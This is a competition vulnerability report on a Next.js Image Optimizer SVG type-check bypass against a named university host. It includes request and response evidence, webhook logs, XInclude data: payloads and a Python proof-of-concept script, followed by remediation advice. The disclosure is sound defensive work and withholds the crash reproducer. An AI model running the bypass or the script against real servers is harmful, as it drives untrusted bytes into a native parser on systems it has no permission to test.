---
title: "Fortify 2026 — Security Finding Submission"
subtitle: "Unauthenticated SVG type-check bypass in Next.js Image Optimizer"
author: "Submission for Exploit Forge Academy judges"
date: "2026-11-25"
---

# Finding at a Glance

| | |
|---|---|
| **Vulnerability** | Unauthenticated SVG type-check bypass in the Next.js Image Optimization API; attacker-controlled SVG is rasterized server-side by `librsvg` despite the SVG deny-list. |
| **Target** | `https://nithub.unilag.edu.ng/event/_next/image` (in-scope per challenge brief) |
| **Authentication required** | **None** — anonymous HTTP GET |
| **Attack complexity** | Low — single HTTP request, publicly reproducible with `curl` |
| **Confirmed impact** | Server-side native-parser (`librsvg`) driven by attacker bytes; XInclude `data:` processing (CVE-2026-96889 precondition) is live. |
| **Related advisories** | CVE-2026-119347 (Next.js SVG rejection bypass, fixed in 16.4.5 / 15.5.29); CVE-2026-96889 (`librsvg` nested-XInclude UAF, RCE on glibc, fixed in `librsvg` 2.57.5 and Next.js 16.4.1 / 15.5.28). |
| **Self-assessed severity** | **Medium (50 pts)** — confirmed primitive only; RCE escalation not asserted (see §4). |
| **Companion PoC video** | `Fortify2026_Nithub_SVG_Bypass_PoC.mp4` (step-by-step walkthrough, 67s) |

![Figure 0 — Bypass mechanism. SVG served as SVG is correctly rejected (left). The same SVG prefixed with an XML comment `<!--ftypavif-->` is misclassified as `image/avif` by `detectContentType()` and rendered by the server-side rasterizer (right).](poc/flowchart.png){ width=560px }

\newpage

# 1. Vulnerability Title

**Unauthenticated SVG Type-Check Bypass in the Next.js Image Optimization API — Attacker-Controlled SVG Rendered Server-Side, with `librsvg` XInclude Processing (CVE-2026-96889 Precondition) Reachable**

# 2. Vulnerability Description

## In one paragraph

The Next.js `/_next/image` endpoint decides whether a fetched image may be rendered by **sniffing the first bytes of the fetched body** (not by trusting the upstream `Content-Type` and not through parser-level refusal). SVG is on the deny-list, so an upstream `image/svg+xml` response is correctly rejected with `HTTP 400`. However, prefixing an attacker-controlled SVG with the 15 bytes `<!--ftypavif-->` makes the sniffer classify the exact same body as **`image/avif`** — because `<!--` is accepted as unknown/zero-matching and `ftypavif` at offset 4 satisfies the AVIF/HEIF `ftyp`-box signature — after which the bytes are handed to the SVG rasterizer (`sharp` → `libvips` → `librsvg`) and fully rendered. No authentication is required, and because the deployment does not enforce an `images.remotePatterns` allowlist, an unauthenticated internet user chooses the exact bytes the native parser receives.

## Why this matters

The attacker-controlled SVG is further permitted to use **XInclude** with `data:` URIs — the specific `librsvg` feature exploited by CVE-2026-96889's use-after-free reproducer. This report demonstrates non-destructively that the XInclude code path is live on the deployment (pixels declared *inside* an inner `data:`-URI SVG appear in the rasterized output). The RCE reproducer itself was **not** fired: the public PoC for CVE-2026-96889 is a crash reproducer, and firing it on this live shared endpoint would cause a denial of service, which the Fortify 2026 RoE §1.2 and §1.4 forbid.

## Root cause — two defects combine

1. **`detectContentType()` is confusable by a leading XML comment.** The SVG rejection fires on byte-signature match, so the same body that is classified as SVG (rejected) is classified as AVIF (accepted) when wrapped in `<!--ftypavif-->`. This is the CVE-2026-119347 class of bug.
2. **No remote-URL allowlist on the optimizer.** `url=` accepts arbitrary external hosts, so the attacker — not the site operator — chooses the bytes fed to the server-side native SVG/XML parser. The target fetched the attacker's listener from its own server IP (`196.45.48.143`, UA `node`).

The combined effect is that an unauthenticated remote party drives server-side `librsvg` with chosen bytes, over an SVG feature (XInclude of `data:` URIs) that a known RCE advisory specifically targets.

# 3. Affected Component

| Item | Observed value |
|---|---|
| Host | `https://nithub.unilag.edu.ng` |
| Endpoint | `/event/_next/image` (Next.js built-in Image Optimization API) |
| Parameters | `url`, `w`, `q` |
| Authentication | **None required** (no cookies, no session) |
| Front end | `Server: nginx/1.18.0 (Ubuntu)` |
| Framework | Next.js 16.2.5 (Image Optimization API) — within the CVE-2026-119347 and CVE-2026-96889 affected ranges |
| Image stack | `sharp` → `libvips` → `librsvg` (modern bundled build — see §6 E.6) |
| Server egress attribution | Source IP `196.45.48.143`, User-Agent `node` (observed in attacker-listener logs during the fetch) |
| Remote-URL allowlist | No effective `images.remotePatterns` restriction |

Advisories cited (please verify current NVD/GHSA entries at triage time; CVE IDs are taken from the researcher's prior intelligence pass and were not re-verified against the CVE database in this session):

- **CVE-2026-119347** — Next.js Image Optimization API magic-byte confusion / SVG rejection bypass. Fixed in Next.js **16.4.5** (and **15.5.29** on the 15.x line).
- **CVE-2026-96889** — `librsvg` (via `sharp`): nested XInclude duplicate-entity use-after-free; RCE on glibc. Fixed in **librsvg 2.57.5**, and in Next.js **16.4.1** / **15.5.28**.

# 4. Severity Level

**Medium (50 points)**

**Confirmed by direct, non-destructive evidence captured during this assessment:**

1. The SVG type-check bypass fires on the live endpoint — attacker-controlled SVG geometry is rendered server-side despite the `image type is not allowed` gate.
2. The server performs an outbound fetch from its own network position (`196.45.48.143`, UA `node`) to any URL the attacker supplies, with no allowlist.
3. The specific `librsvg` XInclude `data:` code path exploited by CVE-2026-96889's reproducer is live — pixels declared *inside* an inner `data:` SVG appear in the output.

**Not confirmed, and explicitly not claimed as part of this severity:**

4. End-to-end code execution via CVE-2026-96889. The exact `librsvg` patch level cannot be read externally (decode failures are returned verbatim, with no library-version leak), and the only public PoC for this CVE is a crash reproducer — firing it would crash the shared optimizer process (DoS), which the RoE forbids.

The deployed `librsvg` is a modern bundled build (behavioral fingerprinting places it at **≥ 2.60.0**, and likely **≥ 2.62.0** — the renderer bundled inside the `@img/sharp-libvips` prebuilt binary, not the host-OS `librsvg`). The UAF fix lives at **2.60.3 / 2.61.5 / 2.62.4 / 2.63.2** — the deployed build may or may not be patched. Severity is therefore held to **Medium** on the confirmed primitive. Judges may re-rate upward if a disposable replica running the same `@img/sharp-libvips` prebuilt confirms exploitability, or downward if the library is confirmed patched. Severity has not been inflated.

# 5. Impact

- **Unauthenticated attacker-controlled input into a native XML/SVG parser.** The optimizer fetches a URL of the caller's choosing and parses the returned bytes with `librsvg`. No account, token, or same-origin path is required.
- **Server-side request primitive (SSRF-adjacent).** The server performs the outbound fetch from `196.45.48.143` with UA `node`, i.e. from its own network position, to any URL the attacker supplies. Even disregarding the native-parser escalation path, this is an unauthenticated server-side fetcher whose response bytes influence the returned image (a rendering oracle).
- **Reachable RCE precondition on the deployed stack.** CVE-2026-96889 is RCE on glibc. The affected parser is the one in the request path, and the specific XInclude feature exercised by its reproducer (`data:` URIs) is confirmed to execute in this deployment. Successful exploitation would yield code execution in the image-optimizer process (the application server's user context) — enabling data access, lateral movement into the internal network, and further compromise. This outcome is **not asserted** in this report because (a) the deployed `librsvg` patch level is not externally readable, and (b) the available PoC is a crash reproducer and cannot be fired under the RoE.
- **Denial of service is also in scope of the underlying defect.** The CVE-2026-96889 reproducer frees an `xmlEntity` still referenced by the outer parser. Any attacker willing to disregard availability constraints could crash the optimizer by firing the public reproducer. Not demonstrated in this report, and deliberately so.
- **`images.dangerouslyAllowSVG` is ineffective.** Because the rejection is bytes-based, setting the flag to `false` does not prevent SVG from reaching the rasterizer when the body is wrapped in `<!--ftypavif-->`.

\newpage

# 6. Evidence

All evidence below is from the reporter's own environment on **2026-11-25** (approximately 13:19–13:23 UTC), with no cookies and no authentication. Probes are single, bounded HTTP requests; nothing persistent was written to the target. A step-by-step video walkthrough accompanies this report (`Fortify2026_Nithub_SVG_Bypass_PoC.mp4`, 67 seconds).

## E.1 — Baseline: optimizer is live (control)

```
GET /event/_next/image?url=%2Fevent%2Ficon.png&w=64&q=75
→ HTTP/1.1 200 OK
   Server: nginx/1.18.0 (Ubuntu)
   Content-Type: image/png
   Content-Length: 497
   X-Nextjs-Cache: HIT
   Content-Security-Policy: script-src 'none'; frame-src 'none'; sandbox;
```

## E.2 — Control: SVG served as SVG is rejected

Upstream URL serves `Content-Type: image/svg+xml`; the optimizer refuses to process it:

```
GET /event/_next/image?url=https%3A%2F%2Fcdn.jsdelivr.net%2Fnpm%2Fsimple-icons%4015.0.0%2Ficons%2Fgithub.svg&w=64&q=75
→ HTTP/1.1 400 Bad Request
   Server: nginx/1.18.0 (Ubuntu)
   Body: "url" parameter is valid but image type is not allowed
```

This establishes that SVG is on the deny list and that a real type-check is being enforced.

## E.3 — Type-check bypass fires: attacker-controlled SVG rendered server-side

Attacker-controlled host (webhook.site token) serves the following body, with `Content-Type: image/svg+xml`:

```xml
<!--ftypavif--><svg xmlns="http://www.w3.org/2000/svg" width="64" height="64">
  <rect width="64" height="64" fill="#00ff00"/>
  <circle cx="32" cy="32" r="20" fill="#0000ff"/>
</svg>
```

Request / response:

```
GET /event/_next/image?url=<encoded_attacker_url>&w=64&q=75
→ HTTP/1.1 200 OK
   Server: nginx/1.18.0 (Ubuntu)
   Content-Type: image/jpeg
   Content-Length: 1001
   Content-Disposition: attachment; filename="b86dc16c-6c09-4263-be86-08cd90442615.jpeg"
   X-Nextjs-Cache: MISS
   First 16 bytes: ff d8 ff db 00 43 00 08 08 08 08 09 08 09 0a 0a   (JPEG/JFIF)
   MD5: 83b2f6432012b11f726cfaceb25d43f6
```

(Output format is client-negotiated: a request with `Accept: image/webp,image/*` returns `image/webp` of the same rendered content. Rendering is identical.)

Decoded output (PIL / `Image.open(..).convert("RGBA")`):

- **Size:** 64 × 64 (matches `w=64` request parameter)
- **Top colors (count, RGBA):**
  - `(1020, (0, 255, 1, 255))` — green rect body
  - `(472,  (0, 255, 0, 255))` — pure green
  - `(189,  (0, 0, 254, 255))` — blue circle body
- **Channel histogram:**
  - pixels with G ≥ 200: **2,776**
  - pixels with B ≥ 200: **1,099**
  - pixels with R ≥ 200: **0**

![Figure E.3 — Rendered output of the bypass (64×64, upscaled 4× with nearest-neighbor to preserve pixel values). Green rect + blue circle = the attacker-specified geometry, rendered server-side despite the SVG ban.](poc/bypass_output_x4.png){ width=220px }

The attacker-specified geometry (green rectangle + blue circle) is unambiguously present in the rasterized output. No red pixels means this is not an error image. The SVG was parsed and rendered server-side despite the SVG ban.

Saved artifact: `poc/bypass_output.jpeg`.

## E.4 — Server-side fetch attribution

Webhook listener log for the token used in §E.3 (newest first; the direct checks are the reporter's own baseline requests from `105.112.23.92`; the top row is the target's own server-side fetch):

```
2026-11-25 13:22:45  ip=196.45.48.143   ua=node               uri=.../b86dc16c-...?cb_bypass_1795612950
2026-11-25 13:22:33  ip=105.112.23.92   ua=curl/8.21.0        uri=.../b86dc16c-...?cb_direct_body
2026-11-25 13:22:31  ip=105.112.23.92   ua=curl/8.21.0        uri=.../b86dc16c-...?cb_direct_check
```

The target's server (IP `196.45.48.143`) fetched the attacker-controlled URL with `User-Agent: node` at the exact moment the optimizer request was issued. This confirms the outbound fetch is performed by the Next.js server itself, from its own network position.

Saved artifact: `poc/webhook_requests.json`.

## E.5 — XInclude `data:` is processed (CVE-2026-96889 precondition reachable)

Attacker-controlled host now serves:

```xml
<!--ftypavif--><svg xmlns="http://www.w3.org/2000/svg"
     xmlns:xi="http://www.w3.org/2001/XInclude" width="64" height="64">
  <xi:include href="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20width='32'%20height='32'%3E%3Crect%20width='32'%20height='32'%20fill='%23ff00ff'/%3E%3C/svg%3E" parse="xml"/>
</svg>
```

The inner SVG, declared inside the `data:` URI, specifies a 32×32 magenta (`#ff00ff`) rectangle. If `librsvg` resolves the XInclude, those magenta pixels appear in the output; if not, the outer SVG is empty and the output is transparent.

Request / response:

```
GET /event/_next/image?url=<encoded_attacker_url>&w=64&q=75
Accept: image/webp,image/*
→ HTTP/1.1 200 OK
   Content-Type: image/webp
   Content-Length: 158
   X-Nextjs-Cache: MISS
   Content-Disposition: attachment; filename="b86dc16c-6c09-4263-be86-08cd90442615.webp"
   First 16 bytes: 52 49 46 46 96 00 00 00 57 45 42 50 56 50 38 58   (RIFF…WEBP)
```

Decoded output:

- **Size:** 64 × 64 WebP
- **Magenta-like pixels (R ≥ 200, G ≤ 50, B ≥ 200):** **1,023**
- Top colors include `(255, 0, 255, 255)` and `(255, 1, 255, 255)` — magenta from the inner `data:` SVG

![Figure E.5 — XInclude `data:` output (64×64 WebP, upscaled 4× nearest). The magenta pixels are declared *inside* the inner `data:` SVG; their appearance in the final raster proves `librsvg` resolved the XInclude and rendered the referenced document. This is the exact code path CVE-2026-96889's UAF reproducer exploits.](poc/xinclude_data_output_x4.png){ width=220px }

The inner-`data:`-SVG's geometry made it into the final raster. The XInclude code path that CVE-2026-96889's reproducer exercises is live.

Saved artifact: `poc/xinclude_data_output.webp`.

## E.6 — `librsvg` version fingerprint (modern bundled build)

Behavioral fingerprinting (performed in a prior session; not re-run here to avoid redundant probing) establishes that the rendering library is a **modern bundled `librsvg`** rather than the OS-provided version:

- `image-rendering` CSS attribute is honored (nearest-neighbor vs. bilinear) — present ≥ **2.57.0**.
- `dominant-baseline="hanging"` correctly shifts glyphs below the baseline — ≥ **2.60.0**.
- Markers at the end of open subpaths are rendered — ≥ **2.62.0** (likely).

This matches the `librsvg` bundled inside the `@img/sharp-libvips` prebuilt binary, not the Ubuntu 20.04 base image's `librsvg` 2.48/2.52. The exact patch level is not externally readable: decode failures (truncated JPEG, bad SVG, etc.) are returned verbatim, with no `libvips`/`librsvg` version string in headers or bodies. CVE-2026-96889 exploitability on this specific deployment is therefore **unknown**.

## E.7 — DELIBERATELY NOT PERFORMED

The public reproducer for CVE-2026-96889 is a crash reproducer (it frees an `xmlEntity` still referenced by the outer parser). Firing it on this live shared endpoint would cause a denial of service. **Not executed per Fortify 2026 RoE §1.2 ("Do not disrupt application availability or interfere with other users' activities") and §1.4 ("Do not execute destructive actions in attempt to demonstrate the full exploitability of a vulnerability").**

## E.8 — Reproduction script (non-destructive)

```python
#!/usr/bin/env python3
# Non-destructive PoC: reproduce the Next.js SVG type-check bypass
# plus XInclude-data: reachability. Requires: pip install pillow
import io, json, random, urllib.parse, urllib.request
from PIL import Image

TARGET = "https://nithub.unilag.edu.ng/event/_next/image"
TOKEN  = "<your-webhook.site-token-uuid>"   # any attacker-controlled HTTP host works

def arm(svg):
    req = urllib.request.Request(
        f"https://webhook.site/token/{TOKEN}",
        data=json.dumps({"default_content_type": "image/svg+xml",
                         "default_content": svg,
                         "default_status": 200}).encode(),
        method="PUT",
        headers={"Content-Type": "application/json"})
    urllib.request.urlopen(req, timeout=30).read()

def fire(label):
    url = f"https://webhook.site/{TOKEN}?cb_{label}_{random.randint(10000,99999)}"
    q = f"url={urllib.parse.quote(url, safe='')}&w=64&q=75"
    r = urllib.request.urlopen(urllib.request.Request(
        TARGET + "?" + q,
        headers={"Accept": "image/webp,image/*"}))
    body = r.read()
    im = Image.open(io.BytesIO(body)).convert("RGBA")
    top = sorted(im.getcolors(maxcolors=10**6), reverse=True)[:5]
    print(f"{label}: HTTP {r.status} {r.headers.get('content-type')} "
          f"len={len(body)} size={im.size} cache={r.headers.get('x-nextjs-cache')}")
    print("  top colors:", top)

# Test 1 — bypass: expect 200 image/webp, green+blue pixels
arm('<!--ftypavif--><svg xmlns="http://www.w3.org/2000/svg" width="64" height="64">'
    '<rect width="64" height="64" fill="#00ff00"/>'
    '<circle cx="32" cy="32" r="20" fill="#0000ff"/></svg>')
fire("bypass")

# Test 2 — XInclude data: expect 200 image/webp, magenta (255,0,255) pixels
inc = ("data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20"
       "width='32'%20height='32'%3E%3Crect%20width='32'%20height='32'%20"
       "fill='%23ff00ff'/%3E%3C/svg%3E")
arm('<!--ftypavif--><svg xmlns="http://www.w3.org/2000/svg" '
    'xmlns:xi="http://www.w3.org/2001/XInclude" width="64" height="64">'
    f'<xi:include href="{inc}" parse="xml"/></svg>')
fire("xinclude_data")
```

**Do not** substitute the public CVE-2026-96889 UAF reproducer for either payload. It is a crash reproducer and will DoS the optimizer, violating the RoE.

## E.9 — Saved artifacts

Under `poc/`:

| File | Purpose |
|---|---|
| `bypass_output.jpeg` | Output of the type-check bypass; 64×64 JPEG, green rect + blue circle |
| `bypass_output_x4.png` | 4× nearest-neighbor upscale of bypass output for visual inspection |
| `xinclude_data_output.webp` | Output of the XInclude `data:` test; 64×64 WebP with magenta pixels |
| `xinclude_data_output_x4.png` | 4× nearest-neighbor upscale of XInclude output |
| `flowchart.png` | Bypass-mechanism diagram (Figure 0) |
| `h_baseline.txt` | Baseline optimizer response headers |
| `h_svg_reject.txt` | Control response headers (SVG-as-SVG rejected) |
| `h_bypass.txt` | Response headers of the successful bypass |
| `h_xinclude_data.txt` | Response headers of the XInclude `data:` test |
| `webhook_requests.json` | Webhook listener log showing server-side fetch attribution |

The accompanying `Fortify2026_Nithub_SVG_Bypass_PoC.mp4` walkthrough shows the live request/response pairs and decoded outputs in sequence.

\newpage

# 7. Remediation

**Primary fixes — close the bypass and the parser exposure:**

1. **Upgrade Next.js.** Move to **≥ 16.4.5** (or **≥ 15.5.29** on the 15.x line). This closes CVE-2026-119347 (the magic-byte / SVG-rejection bypass itself). Current 16.x releases also include the CVE-2026-96889 fix (16.4.1+ / 15.5.28+).
2. **Refresh the bundled `librsvg`.** Upgrade `@img/sharp-libvips` so the prebuilt binary carries **`librsvg ≥ 2.57.5`**, and verify the actually-loaded library version at runtime (the host-OS `librsvg` version is not what `sharp` uses). Confirm by inspecting the prebuilt binary's shipped `librsvg` or using `sharp.versions`.
3. **Enforce an `images.remotePatterns` allowlist** in `next.config.js` so the `url=` target can only be a trusted host. The current effectively empty allowlist is what lets the attacker supply the bytes.
4. **If the optimizer does not need to fetch remote images at all**, set `images.unoptimized: true` for self-hosted deployments, or restrict `url=` to same-origin paths beginning with `/`.
5. **Reject SVG at the edge for `/_next/image`** in nginx or the WAF: block `url=` values whose upstream `Content-Type` is `image/svg+xml`, or whose path ends in `.svg` — a byte-sniff-independent second layer.

**Defense in depth — bound future native-parser bugs:**

6. **Sandbox the image optimizer**: run as an unprivileged worker with seccomp/AppArmor, a read-only filesystem, no outbound network except approved CDN origins, and CPU/memory/time limits. Bounds the blast radius of any future SVG/image-parser RCE.
7. **Disable HTTP redirect-following in the optimizer's upstream HTTP client**, or re-validate on every redirect hop. Prevents 3xx chains from pivoting to internal destinations.
8. **Monitor `/_next/image` requests** whose `url=` target is a non-allowlisted host or ends in `.svg`, and alert on repeated `X-Nextjs-Cache: MISS` bursts to external destinations.

---

## Reporter note on evidence quality

All evidence in Section 6 was captured in the reporter's own environment on 2026-11-25 at the timestamps shown in the headers and the webhook log, from a clean session with no cookies or authentication. The `librsvg` behavioral fingerprint in §E.6 was established in a prior non-destructive assessment pass and is cited rather than re-run. The CVE-2026-96889 UAF reproducer was **not** fired; its omission is deliberate and is the reason severity is held at Medium rather than being inflated to Critical on an unverified version match. A step-by-step video walkthrough accompanies this report.
